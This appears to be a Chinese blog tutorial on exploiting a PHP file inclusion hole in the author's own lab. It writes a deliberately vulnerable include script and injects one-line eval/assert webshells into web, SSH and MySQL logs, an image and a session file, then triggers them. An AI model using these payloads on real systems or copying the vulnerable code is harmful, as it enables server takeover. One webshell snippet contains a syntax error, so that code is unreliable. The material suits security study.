---
# 当前页面内容标题
title: 文件包含漏洞
# 当前页面图标
icon: "hot"
# 分类
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: false
# 是否将该文章添加至时间线中
timeline: false
index: false
date: 2022-02-09
dir:
    link: true
---

# 文件包含漏洞利用

首先，在网页根目录创建`test.php`，进行测试

`test.php`内容如下：

```php
<?php
include $_GET["cmd"];
?>
```

访问`test.php?cmd=/etc/passwd`，进行测试，返回结果如下则模拟成功

![image-20220928164803683](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928164803683.png)

## 一、包含web日志

当我们对服务器发起请求时，一般情况下web服务器都会对我们的请求记录到日志文件中，因为`include`会将文件中的`php`语句执行，所以当我们的请求包含了php语句，服务器记录到了log文件中，就可以通过文件包含漏洞去执行log文件里的php语句

**案例：**

因为我使用的是`xampp`来对环境进行部署，log文件默认保存在`/opt/lampp/logs/`

![image-20220928165522331](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928165522331.png)

查看`access_log`可以看到我刚刚的那个请求

![image-20220928165625803](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928165625803.png)

尝试使用一句话木马发起get请求

```
http://192.168.235.152/test.php?a=<?php eval($_GET["shell"]);?>
```

![image-20220928165803022](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928165803022.png)

发现`<""`被URL编码了，这是在发送时浏览器自动进行的操作，所以需要使用代理对数据进行修改

开启代理

![image-20220928170847884](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928170847884.png)

发送请求，找到php语句修改后重新发送

![image-20220928170912522](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928170912522.png)

Burp就拦截到了数据

![image-20220928170940105](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928170940105.png)

修改请求，然后发送，再次查看log文件

![image-20220928171037153](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928171037153.png)

一句话木马就写入到日志文件了，但是可以发现`"`被转义了😂，这里需要换成`'`才可以成功

![image-20220928171524597](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928171524597.png)

然后通过`test.php`进行测试，因为之前被注入了一个错误的php语句，在多条php语句的情况下，include会按照顺序执行php语句，所以我们最后添加的php无法执行，因为前一句php报错了，所以我们手动将这一行删除

![image-20220928171609521](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928171609521.png)

删除完毕😂

![image-20220928171857763](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928171857763.png)

又报错了，这里eval换成assert试试

**arse error**: syntax error, unexpected end of file in **/opt/lampp/logs/access_log(44385) : eval()'d code** on line **1**

![image-20220928172210055](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928172210055.png)

![image-20220928173521041](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928173521041.png)

访问成功

```
http://192.168.235.152/test.php?cmd=/opt/lampp/logs/access_log&shell=phpinfo()
```

![image-20220928173543913](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928173543913.png)

## 二、包含登录日志

以SSH为例，通过在提供用户名时使用php一句话木马进行注入。

Linux默认登录日志路径：`/var/log/auth.log`或`/var/log/secure`

查看`/var/log/auth.log`，没找到

![image-20220928174051185](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928174051185.png)

查看`/var/log/secure`

![image-20220928174249655](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928174249655.png)

尝试登录

![image-20220928182450477](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928182450477.png)

再次查看日志

![image-20220928182432361](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928182432361.png)

使用php一句话木马

![image-20220928182539496](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928182539496.png)

注入成功

![image-20220928182600183](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928182600183.png)

尝试获取`phpinfo`，发现权限不够

![image-20220928182809235](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928182809235.png)

因为只是测试，所以我直接修改权限

```
[root@localhost ~]# chmod o+r /var/log/secure
```

获取成功

![image-20220928183015414](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928183015414.png)

## 三、包含MySql文件

查看`mysql`查询日志是否开启

```
mysql> show variables like 'general_log';
```

开启`mysql`查询日志

```
mysql> set global general_log = On;
```

查看`mysql`查询日志保存的位置

```
mysql> show variables like 'general_log_file';
```

尝试登录`dvwa`

![image-20220928185932550](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928185932550.png)

然后查看刚刚的日志文件

![image-20220928190004605](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928190004605.png)

使用php一句话木马尝试登录

![image-20220928190051597](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928190051597.png)

成功，数据没有进行任何处理

测试一下：

```
http://192.168.235.152/test.php?cmd=/usr/local/mysql/data/localhost.log&shell=phpinfo()
```

![image-20220928190154399](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928190154399.png)

还是权限不够，添加权限

```
[root@localhost data]# chmod 777 /usr/local/mysql/data/localhost.log
```

还是不行

![image-20220928190531100](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928190531100.png)

[TODO] 为什么不行？

## 四、包含上传文件

在根目录里创建一个文件夹`tem`，并在里面存储一张图片和一句话木马

![image-20220928192101802](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928192101802.png)

`muma.php`内容如下

```
<?php @assert($_GET['shell'];)?>
```

合成图片

```
[root@localhost tem]# cat muma.php >> cmd.jpg
```

cat查看图片

![image-20220928192341838](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928192341838.png)

尝试运行，报错，尝试换一张jpg照片也一样，换了一张png的成功

![image-20220928192914652](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928192914652.png)

![image-20220928192958277](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928192958277.png)

## 四、session临时文件包含

模拟一个超简单的登录，首先创建一个login.php

```php
<?php
session_start();
$_SESSION['name']=$_GET['user'];
?>
```

然后访问，没有报错就说明成功了，然后查看session文件

```php
http://192.168.235.152/login.php?user=admin
```

![image-20220928234945956](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928234945956.png)

可以看到admin已经被进入其中

![image-20220928235034254](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928235034254.png)

接下来尝试写入一句话木马，也写入成功

![image-20220928235157131](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928235157131.png)

然后就是假装获取一下sessionid，首先右键检查，然后点network，然后重新加载网页，就可以获取sessionid了

![image-20220928235341450](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928235341450.png)

然后尝试include，成功打开

```
http://192.168.235.152/test.php?cmd=../temp/sess_pgqucnp3p4gb7edd31ruj160f0
```

![image-20220928235500458](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928235500458.png)

```
http://192.168.235.152/test.php?cmd=../temp/sess_pgqucnp3p4gb7edd31ruj160f0&shell=phpinfo();
```

接下来带参数，成功了

![image-20220928235601906](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220928235601906.png)